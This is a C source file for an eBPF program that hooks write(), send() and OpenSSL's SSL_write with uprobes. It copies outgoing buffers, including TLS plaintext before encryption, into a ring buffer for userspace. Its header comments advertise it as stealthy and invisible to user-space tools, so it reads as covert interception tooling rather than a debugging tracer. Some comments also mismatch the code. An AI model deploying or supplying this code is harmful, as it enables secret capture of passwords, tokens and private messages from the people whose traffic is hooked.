// eBPF Program for Kernel-Level Function Hooking
// Compiles to eBPF bytecode loaded into the kernel
// Invisible to user-space tools - true kernel-level stealth

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <linux/ptrace.h>
#include <linux/version.h>

// Ring buffer for passing captured data to userspace
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024); // 256KB ring buffer
} ringbuf SEC(".maps");

// Per-CPU array for storing function arguments temporarily
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, u64); // Store buffer pointer
} args_map SEC(".maps");

// Structure for captured data events
struct capture_event {
    u64 pid;
    u64 timestamp;
    u32 data_len;
    u8 data[512]; // Truncated for efficiency
};

// Hook for write() syscall
SEC("uprobe/write")
int hook_write_entry(struct pt_regs *ctx) {
    u32 key = 0;
    u64 *arg_ptr = bpf_map_lookup_elem(&args_map, &key);
    
    if (arg_ptr) {
        // Store buffer pointer (first argument on x86_64)
        #ifdef __x86_64__
        *arg_ptr = PT_REGS_PARM2(ctx); // buf pointer (second argument)
        #endif
        #ifdef __aarch64__
        *arg_ptr = PT_REGS_PARM2(ctx); // ARM64 calling convention
        #endif
    }
    
    return 0;
}

SEC("uretprobe/write")
int hook_write_exit(struct pt_regs *ctx) {
    u32 key = 0;
    u64 *buf_ptr = bpf_map_lookup_elem(&args_map, &key);
    
    if (!buf_ptr || *buf_ptr == 0) {
        return 0;
    }
    
    // Get return value (bytes written)
    #ifdef __x86_64__
    long bytes_written = PT_REGS_RC(ctx);
    #endif
    #ifdef __aarch64__
    long bytes_written = PT_REGS_RC(ctx);
    #endif
    
    if (bytes_written <= 0 || bytes_written > 512) {
        return 0;
    }
    
    // Reserve space in ring buffer
    struct capture_event *event = bpf_ringbuf_reserve(&ringbuf, sizeof(struct capture_event), 0);
    if (!event) {
        return 0;
    }
    
    // Fill event structure
    event->pid = bpf_get_current_pid_tgid() >> 32;
    event->timestamp = bpf_ktime_get_ns();
    event->data_len = (u32)bytes_written;
    
    // Read data from userspace (limited to 512 bytes for efficiency)
    long ret = bpf_probe_read_user(event->data, bytes_written < 512 ? bytes_written : 512, (void *)(*buf_ptr));
    
    if (ret < 0) {
        bpf_ringbuf_discard(event, 0);
        return 0;
    }
    
    // Submit to ring buffer
    bpf_ringbuf_submit(event, 0);
    
    // Clear args map
    *buf_ptr = 0;
    
    return 0;
}

// Hook for send() syscall
SEC("uprobe/send")
int hook_send_entry(struct pt_regs *ctx) {
    u32 key = 0;
    u64 *arg_ptr = bpf_map_lookup_elem(&args_map, &key);
    
    if (arg_ptr) {
        #ifdef __x86_64__
        *arg_ptr = PT_REGS_PARM2(ctx); // buf pointer
        #endif
        #ifdef __aarch64__
        *arg_ptr = PT_REGS_PARM2(ctx);
        #endif
    }
    
    return 0;
}

SEC("uretprobe/send")
int hook_send_exit(struct pt_regs *ctx) {
    // Same logic as write_exit
    u32 key = 0;
    u64 *buf_ptr = bpf_map_lookup_elem(&args_map, &key);
    
    if (!buf_ptr || *buf_ptr == 0) {
        return 0;
    }
    
    #ifdef __x86_64__
    long bytes_sent = PT_REGS_RC(ctx);
    #endif
    #ifdef __aarch64__
    long bytes_sent = PT_REGS_RC(ctx);
    #endif
    
    if (bytes_sent <= 0 || bytes_sent > 512) {
        return 0;
    }
    
    struct capture_event *event = bpf_ringbuf_reserve(&ringbuf, sizeof(struct capture_event), 0);
    if (!event) {
        return 0;
    }
    
    event->pid = bpf_get_current_pid_tgid() >> 32;
    event->timestamp = bpf_ktime_get_ns();
    event->data_len = (u32)bytes_sent;
    
    long ret = bpf_probe_read_user(event->data, bytes_sent < 512 ? bytes_sent : 512, (void *)(*buf_ptr));
    
    if (ret < 0) {
        bpf_ringbuf_discard(event, 0);
        return 0;
    }
    
    bpf_ringbuf_submit(event, 0);
    *buf_ptr = 0;
    
    return 0;
}

// Hook for SSL_write (OpenSSL)
SEC("uprobe/SSL_write")
int hook_ssl_write_entry(struct pt_regs *ctx) {
    u32 key = 0;
    u64 *arg_ptr = bpf_map_lookup_elem(&args_map, &key);
    
    if (arg_ptr) {
        #ifdef __x86_64__
        *arg_ptr = PT_REGS_PARM2(ctx); // buf pointer (second argument after SSL*)
        #endif
        #ifdef __aarch64__
        *arg_ptr = PT_REGS_PARM2(ctx);
        #endif
    }
    
    return 0;
}

SEC("uretprobe/SSL_write")
int hook_ssl_write_exit(struct pt_regs *ctx) {
    // Similar to send_exit
    u32 key = 0;
    u64 *buf_ptr = bpf_map_lookup_elem(&args_map, &key);
    
    if (!buf_ptr || *buf_ptr == 0) {
        return 0;
    }
    
    #ifdef __x86_64__
    int bytes_written = (int)PT_REGS_RC(ctx);
    #endif
    #ifdef __aarch64__
    int bytes_written = (int)PT_REGS_RC(ctx);
    #endif
    
    if (bytes_written <= 0 || bytes_written > 512) {
        return 0;
    }
    
    struct capture_event *event = bpf_ringbuf_reserve(&ringbuf, sizeof(struct capture_event), 0);
    if (!event) {
        return 0;
    }
    
    event->pid = bpf_get_current_pid_tgid() >> 32;
    event->timestamp = bpf_ktime_get_ns();
    event->data_len = (u32)bytes_written;
    
    long ret = bpf_probe_read_user(event->data, bytes_written < 512 ? bytes_written : 512, (void *)(*buf_ptr));
    
    if (ret < 0) {
        bpf_ringbuf_discard(event, 0);
        return 0;
    }
    
    bpf_ringbuf_submit(event, 0);
    *buf_ptr = 0;
    
    return 0;
}

// License - required for eBPF programs
char LICENSE[] SEC("license") = "Dual BSD/GPL";

